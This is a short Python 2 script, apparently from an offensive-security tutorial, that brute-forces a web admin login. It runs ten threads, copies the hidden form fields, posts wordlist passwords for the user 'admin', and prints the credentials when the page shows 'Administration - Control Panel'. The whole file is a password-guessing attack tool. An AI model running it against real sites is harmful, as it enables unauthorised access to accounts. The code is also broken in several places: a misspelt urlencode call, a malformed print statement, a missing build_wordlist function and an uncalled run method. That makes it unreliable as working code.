import urllib2
import urllib
import cookielib
import threading
import sys
import Queue

from HTMLParser import HTMLParser

#general settings
user_thread = 10
username = "admin"
wordlist_file =""
resume = None

#target specific settings
target_url = ""
target_post =""

username_field ="username"
password_field = "passwd"

success_check = "Administration - Control Panel"

class Bruter(object):
	def __init__(self, username, words):
		self.username = username
		self.passwd_q = words
		self.found = False

		print "Finished setting up for: %s" % username

	def run_bruteforce(self):
		for i in range(user_thread):
			t = threading.Thread(target = self.web_bruter)
			t.start()

	def web_bruter(self):

		while not self.passwd_q.empty() and not self.found:
			brute =  self.passwd_q.get().rstrip()
			jar = cookielib.FileCookieJar("cookies")
			opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))

			response = opener.open(target_url)
			page = response.read()

			print "Trying: %s : %s (%d left)" % \
			+ (self.username,brute,self.passwd_q.qsize())

			#parse out the hidden fields
			parser = BruteParser()
			parser.feed(page)
			post_tags = parser.tag_results

			# add our username and password fields
			post_tags[username_field] =self.username
			post_tags[password_field] = brute

			login_data = urllib.urllencode(post_tags)
			login_response = opener.open(target_post, login_data)

			login_result = login_response.read()

			if success_check in login_result:
				self.found = True

				print "[*] Bruteforce sucessful."
				print "[*] Username: %s" % username
				print "[*] Password: %s" % brute

class BruteParser(HTMLParser):
	def __init__(self):
		HTMLParser.__init__(self)
		self.tag_results = {}

	def handle_starttag(self, tag, attrs):
		if tag == "input":
			tag_name = None
			tag_value = None
			for name, value in attrs:
				if name =="name":
					tag_name = value
				if name =="value":
					tag_value = value

			if tag_name is not None:
				self.tag_results[tag_name] =value

#paste the build_wordlist
words = build_wordlist(wordlist_file)
bruter_obj = Bruter(username,words)
bruter_obj.run_bruteforce
